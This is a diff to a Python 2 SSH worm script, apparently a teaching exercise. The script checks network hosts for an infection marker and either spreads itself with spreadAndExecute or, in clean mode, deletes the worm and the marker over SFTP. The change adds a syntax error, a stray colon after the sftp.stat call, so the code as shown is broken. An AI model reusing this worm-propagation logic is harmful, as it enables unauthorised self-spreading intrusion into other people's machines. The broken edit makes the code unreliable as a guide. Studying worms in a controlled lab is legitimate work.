@@ -230,7 +230,9 @@ def cleaner(sshClient):
 	
 	# remove the infection (i.e. marker file) from the host
 	# remove the worm program from the host
-	stdErrs = sshClient.exec_command("python " + LOCAL_PATH + "/worm.py -c")
+	sftp = sshClient.open_sftp()
+	sftp.remove(LOCAL_PATH + "/worm.py")
+	sftp.remove(INFECTED_MARKER_FILE)
 
 
 # If we are being run without a command line parameters, 
@@ -312,12 +314,12 @@ for host in networkHosts:
 			# Try to fetch marker file from victim
 			# Better way to check if victim machine is infected
 			# Will throw IOError if it does not exist
-			sftp.stat(INFECTED_MARKER_FILE)
+			sftp.stat(INFECTED_MARKER_FILE):
 
 			# If it fails, next lines will be skipped and start after "except IOError:" and we can attack victim system
 			# If it exists:
 			print host + " infected"
-
+			sftp.close()
 			# We now know victim is infected
 			# If an argument to command line is added and it's -c||--clean we will clean instead of infect
 			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
@@ -330,11 +332,7 @@ for host in networkHosts:
 				# If we are not infected then we are the original cleaning machine
 				cleaner(sshInfo)
 				print ' ' +  host + ' successfully cleaned'
-
-				# Remove worm file from our own machine
-				os.remove(LOCAL_PATH + "/worm.py")
-
-			sftp.close()
+			
 			sshInfo.close()
 		# INFECTED_MARKER_FILE does not exist, spread & Exe
 		except IOError:
@@ -342,7 +340,7 @@ for host in networkHosts:
 			# If victim machine isn't yet infected and we want to clean, do nothing
 			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
 				print host + " not infected, leaving alone"
-			# Else we want to fuck this shit up
+			# Else we want to fck this shit up
 			else:
 				print "Trying to spread..."
 				spreadAndExecute(sshInfo)
